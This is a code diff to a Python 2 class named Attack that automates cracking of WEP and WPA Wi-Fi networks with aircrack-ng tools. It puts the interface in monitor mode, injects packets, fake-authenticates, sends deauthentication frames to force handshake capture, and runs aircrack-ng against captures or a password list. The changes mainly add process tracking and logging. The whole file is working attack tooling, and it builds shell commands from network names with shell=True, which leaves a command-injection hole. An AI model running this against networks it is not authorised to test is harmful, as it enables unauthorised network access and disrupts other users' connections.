@@ -1,21 +1,20 @@
 from subprocess import Popen, PIPE, STDOUT
 import os
 from sys import stdout
-from signal import SIGINT
+import signal
 import sched
 import signal
 import csv
 import time
-import commands
 from execute import execute
 from network import get_mac_address
 from threading import Timer
 DN = open(os.devnull, 'w')
 
 
-def send_interrupt(process):
+def send_sigterm(process):
     try:
-        os.kill(process.pid, SIGINT)
+        os.kill(process.pid, signal.SIGTERM)
         # os.kill(process.pid, SIGTERM)
     except OSError:
         pass  # process cannot be killed
@@ -51,7 +50,7 @@ class Attack():
     def channel_change(self):
         pass
         cmd = ['iw', 'dev', self.iface, 'set', 'channel', self.channel]
-        Popen(cmd, stdout=PIPE, stderr=DN)
+        Popen(cmd, stdout=PIPE, stderr=DN).communicate()
 
     def wep_inject(self):
         cmd = 'iw dev '+self.iface+' set channel '+self.channel+';aireplay-ng -9 --ignore-negative-one -e '+self.essid+' -a '+self.bssid+' '+self.iface
@@ -74,11 +73,12 @@ class Attack():
         for fa_index in xrange(1, max_attempts + 1):
             cmd = 'iw dev '+self.iface+' set channel '+self.channel+';aireplay-ng -1 0 -T 1 -a '+self.bssid+' '+self.iface
             proc_fakeauth = Popen(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
+            self.proc_list.append(proc_fakeauth)
 
             started = time.time()
             while proc_fakeauth.poll() == None and time.time() - started <= max_wait: pass
             if time.time() - started > max_wait:
-                send_interrupt(proc_fakeauth)
+                send_sigterm(proc_fakeauth)
                 stdout.flush()
                 time.sleep(0.5)
                 continue
@@ -110,6 +110,7 @@ class Attack():
         cmd.append(self.iface)
 
         deauth_proc = Popen(cmd, stdout=DN, stderr=DN)
+        self.proc_list.append(deauth_proc)
         deauth_proc.wait()
 
     def wep_arp_send(self):
@@ -127,8 +128,10 @@ class Attack():
         execute('iwconfig '+self.iface+' mode monitor')
 
         if 'WEP' in self.enc_type.upper():
+            print "[*] WEP CRACK START"
             self.wep_run()
         elif 'WPA' in self.enc_type.upper():
+            print "[*] WPAx CRACK START"
             self.wpa_run()
         elif 'OPN' in self.enc_type.upper():
             self.key = "OPN"
@@ -152,6 +155,7 @@ class Attack():
 
         dump_cmd = ['airodump-ng', '-c', self.channel, '--bssid', self.bssid, '-w', './log/' + self.bssid, self.iface]
         airodump_proc = Popen(dump_cmd, stdout=DN, stderr=DN)
+        self.proc_list.append(airodump_proc)
 
         self.wep_fake_auth()
         self.wep_arp_send()
@@ -167,6 +171,7 @@ class Attack():
 
                     crack_cmd = ['aircrack-ng', '-b', self.bssid, './log/' + self.bssid + '-01.cap', '-l', './log/' + self.bssid + '.key']
                     crack_proc = Popen(crack_cmd, stdout=DN, stderr=DN)
+                    self.proc_list.append(crack_proc)
                     kill_proc = lambda p: p.kill()
                     timer = Timer(20, kill_proc, [crack_proc])
                     try:
@@ -193,16 +198,18 @@ class Attack():
     def wpa_run(self):
         dump_cmd = ['airodump-ng', '-c', self.channel, '--bssid', self.bssid, '-w', './log/' + self.bssid, self.iface]
         airodump_proc = Popen(dump_cmd, stdout=DN, stderr=DN)
+        self.proc_list.append(airodump_proc)
 
         self.send_deauths()
         while self.key == '':
-            output = commands.getoutput('tshark -r ./log/' + self.bssid + '-01.cap | grep "Message 4 of 4"')
+            output = Popen('tshark -r ./log/' + self.bssid + '-01.cap 2>/dev/null| grep "Message 4 of 4"',shell=True, stdout=PIPE).communicate()[0]
             if output.find('Message 4 of 4') != -1:
                 execute('rm ./log/'+self.bssid+'.key')
                 airodump_proc.kill()
                 airodump_proc.communicate()
                 crack_cmd = ['aircrack-ng', '-w', self.password_list, '-b', self.bssid, './log/' + self.bssid + '-01.cap','-l', './log/' + self.bssid + '.key']
                 crack_proc = Popen(crack_cmd, stdout=DN)
+                self.proc_list.append(crack_proc)
                 crack_proc.wait()
                 try:
                     f = open('./log/' + self.bssid + '.key')
@@ -219,6 +226,8 @@ class Attack():
         return self.key
 
     def stop(self):
+        print "[*] CRACKER RECEIVED STOP SIGNAL"
+        print "[*]   Process count: %d" %(len(self.proc_list))
         for proc in self.proc_list:
             try:
                 proc.kill()
